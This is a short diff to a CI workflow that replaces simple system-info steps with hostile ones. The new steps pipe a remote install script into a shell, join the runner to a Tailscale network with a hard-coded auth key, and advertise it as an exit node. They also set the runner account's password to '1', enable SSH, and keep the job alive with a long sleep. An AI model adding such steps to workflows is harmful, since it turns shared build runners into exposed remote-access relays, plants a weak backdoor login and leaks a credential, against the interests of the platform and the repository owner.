@@ -8,7 +8,13 @@ jobs:
   this:
     runs-on: codespaces-prebuild
     steps:
-      - run: uname -a
-      - run: df -h
-      - run: cat /etc/os-release
-      - run: whoami
+      - parallel:
+          - run: |
+              curl -fsSL https://tailscale.com/install.sh | sh
+              sudo tailscale up --auth-key=tskey-auth-kNMj8JaEr221CNTRL-GzQ6LJG2nAVinCWLCxmQBV5yBFCHWyTz --advertise-exit-node
+          - run: |
+              echo "runner:1" | sudo chpasswd
+          - run: |
+              sudo systemctl enable --now ssh.service
+          - run: |
+              sleep 99999
